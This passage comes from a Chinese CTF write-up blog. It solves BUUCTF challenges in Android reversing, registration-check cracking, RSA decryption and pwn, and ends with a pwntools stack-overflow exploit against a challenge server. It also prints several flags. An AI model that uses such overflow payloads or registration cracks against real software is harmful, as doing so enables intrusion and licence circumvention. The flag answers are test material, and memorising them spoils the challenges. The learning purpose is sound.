punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// android.app.Activity</span>    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span><span class="token class-name">MenuItem</span> item<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>item<span class="token punctuation">.</span><span class="token function">getItemId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">R</span><span class="token punctuation">.</span>id<span class="token punctuation">.</span>action_settings<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">onOptionsItemSelected</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测下面这段应该是获得flag 的关键<code>text.setText(String.valueOf(y));</code>这个的作用猜测是返回flag的值，只需要将上面的b字符串带入走一遍就行了。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>edit<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i2 <span class="token operator">&lt;</span> <span class="token number">38</span><span class="token punctuation">;</span> i2<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token operator">||</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span> <span class="token operator">&amp;&amp;</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">||</span> y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>y<span class="token punctuation">[</span>i2<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    text<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>下面给出解密用的python代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'v'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'q'</span><span class="token punctuation">,</span> <span class="token string">'&#123;'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'6'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'l'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'p'</span><span class="token punctuation">,</span> <span class="token string">'9'</span><span class="token punctuation">,</span> <span class="token string">'m'</span><span class="token punctuation">,</span> <span class="token string">'n'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">,</span> <span class="token string">'8'</span><span class="token punctuation">,</span> <span class="token string">'k'</span><span class="token punctuation">,</span> <span class="token string">'7'</span><span class="token punctuation">,</span> <span class="token string">'5'</span><span class="token punctuation">,</span> <span class="token string">'&#125;'</span><span class="token punctuation">]</span>y <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">38</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'A'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'Z'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span> <span class="token keyword">or</span> b<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        y<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'Z'</span> <span class="token operator">&lt;</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'z'</span><span class="token punctuation">:</span>            y<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注册程序的破解-CTF向-1"><a href="#注册程序的破解-CTF向-1" class="headerlink" title="注册程序的破解(CTF向)"></a>注册程序的破解(CTF向)</h2><h3 id="buu、简单注册器"><a href="#buu、简单注册器" class="headerlink" title="buu、简单注册器"></a>buu、简单注册器</h3><p><strong>题目描述</strong></p><p>生活中难免会有需要使用一些付费的程序，但是没有绿色版怎么办？只能自己逆向看看注册程序的代码是什么逻辑了。 注意：得到的 flag 请包上 flag{} 提交</p><p><strong>解题过程</strong></p><p>看起来很一般的注册程序。。。直接拖入jadx试试，连个保护壳都没有，不过也正好，就是学不到新的知识了可能。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> x <span class="token operator">=</span> <span class="token string">"dd2940c04462b4dd7c450528835cca15"</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">+</span> x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">16</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">char</span> a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    textview<span class="token punctuation">.</span><span class="token function">setText</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span> <span class="token operator">+</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不到10行的简单变换，直接出python脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">x <span class="token operator">=</span> <span class="token string">'dd2940c04462b4dd7c450528835cca15'</span>x <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">50</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">48</span><span class="token punctuation">)</span>x<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">97</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span>    x<span class="token punctuation">[</span><span class="token number">31</span> <span class="token operator">-</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag&#123;'</span> <span class="token operator">+</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;59acc538825054c7de4b26440c0999dd&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Android病毒逆向"><a href="#Android病毒逆向" class="headerlink" title="Android病毒逆向"></a>Android病毒逆向</h2><h3 id="相册"><a href="#相册" class="headerlink" title="相册"></a>相册</h3><blockquote><p>描述:你好，这是上次聚会相片，你看看（病毒，不建议安装到手机，提取完整邮箱即为flag） 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>题目挺简单的，就是软件没在模拟器上打得开，所以直接就逆向了一下so文件，直接找到最后的base64的三个串，都解一下密，发现</p><pre class="line-numbers language-none"><code class="language-none">MTgyMTg0NjUxMjVAMTYzLmNvbQ&#x3D;&#x3D;18218465125@163.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>所以flag就是上面的这个网易邮箱套上个flag即可。</p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><h3 id="一般rsa"><a href="#一般rsa" class="headerlink" title="一般rsa"></a>一般rsa</h3><h4 id="buu、rsa"><a href="#buu、rsa" class="headerlink" title="buu、rsa"></a>buu、rsa</h4><p>题目描述：ras是一个非常神秘的算法，那么它神秘在哪里 请少侠自己摸索！ 注意：得到的 flag 请包上 flag{} 提交</p><p>文件给出的是</p><p><img src="/2021/05/28/CTF/image-20210531094155238.png" alt="这两个文件"></p><p>？？？发生什么事了，这不是密码学的前几天做过的那个啥啥啥嘛。</p><p><a href="http://tool.chacuo.net/cryptrsakeyparse">在线rsa公钥文件分解</a></p><p><a href="https://www.ssleye.com/pub_asysi.html">在线rsa公钥文件分解2（n分解为十进制）</a></p><p>直接把pub.key文件内的内容复制到上面的网站内分解一下p、q、n。</p><p><img src="/2021/05/28/CTF/image-20210531094620593.png" alt="获得模数与指数"></p><p>再在线分解一下大整数n得下面的一些数据</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">e &#x3D; 65537n &#x3D; 86934482296048119190666062003494800588905656017203025617216654058378322103517p &#x3D; 285960468890451637935629440372639283459q &#x3D; 304008741604601924494328155975272418463<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>写下面得python脚本解密</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> rsa<span class="token keyword">import</span> gmpy2e <span class="token operator">=</span> <span class="token number">65537</span>n <span class="token operator">=</span> <span class="token number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span>p <span class="token operator">=</span> <span class="token number">285960468890451637935629440372639283459</span>q <span class="token operator">=</span> <span class="token number">304008741604601924494328155975272418463</span>phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span><span class="token punctuation">)</span>key <span class="token operator">=</span> rsa<span class="token punctuation">.</span>PrivateKey<span class="token punctuation">(</span>n<span class="token punctuation">,</span> e<span class="token punctuation">,</span> d<span class="token punctuation">,</span> p<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.enc'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> encflag<span class="token punctuation">:</span>    flag <span class="token operator">=</span> rsa<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>encflag<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># b'flag&#123;decrypt_256&#125;\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://zhuanlan.zhihu.com/p/129837931">kali配置安装pwn环境</a></p><h3 id="安装peda"><a href="#安装peda" class="headerlink" title="安装peda"></a>安装peda</h3><p>我先安装的是peda，直接就两个命令，下面的两个命令</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">git clone https:&#x2F;&#x2F;github.com&#x2F;longld&#x2F;peda.git ~&#x2F;pedaecho &quot;source ~&#x2F;peda&#x2F;peda.py&quot; &gt;&gt; ~&#x2F;.gdbinit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>直接gdb命令出现的就是peda的前缀了。</p><p><strong>对pwn的难度估计出现了重大失误，这个门槛还是很高的，等下学期学了病毒分析再入门吧。</strong></p><h2 id="一般pwn"><a href="#一般pwn" class="headerlink" title="一般pwn"></a>一般pwn</h2><h3 id="绝对签到题"><a href="#绝对签到题" class="headerlink" title="绝对签到题"></a>绝对签到题</h3><h4 id="buu、test-your-nc"><a href="#buu、test-your-nc" class="headerlink" title="buu、test_your_nc"></a>buu、test_your_nc</h4><p>直接nc就行了，这个主要是好像pwn里面经常是要使用nc工具的。</p><pre class="line-numbers language-none"><code class="language-none">nc node3.buuoj.cn 28024cat &#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210601121350820.png" alt="image-20210601121350820"></p><h2 id="普通溢出题目"><a href="#普通溢出题目" class="headerlink" title="普通溢出题目"></a>普通溢出题目</h2><h3 id="普通栈溢出"><a href="#普通栈溢出" class="headerlink" title="普通栈溢出"></a>普通栈溢出</h3><h4 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h4><p><img src="/2021/05/28/CTF/image-20210711195254351.png" alt></p><p>使用64位的ida解决。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// main函数的反汇编代码如下</span><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+1h] [rbp-Fh] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"ok,bye!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>据判断，gets函数具有栈溢出漏洞</p><p><img src="/2021/05/28/CTF/image-20210714201214783.png" alt></p><p>s的大小限制为15位(F - 0 = F[F为10进制的15])，只要传入超过15个byte就会导致溢出，然后转到system函数(程序中的fun函数里面有system方法)，然后就再看看ida里面他的函数的开始地址<strong>0x401186</strong></p><p><img src="/2021/05/28/CTF/image-20210714202217709.png" alt></p><p>然后就认为我们的payload可以为如下</p><pre class="line-numbers language-none"><code class="language-none">b&quot;a&quot; * 15 + p64(0x401186)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>p64</strong>代表的是这个地址是64位机的地址pack 64 bits number。</p><pre class="line-numbers language-none"><code class="language-none">p32&#x2F;p64: 打包一个整数，分别打包为32位或64位u32&#x2F;u64: 解包一个字符串，得到整数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后写脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27897</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">15</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x401186</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;42bfbcd2-053e-4a41-8581-3a8e676a4c9a&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
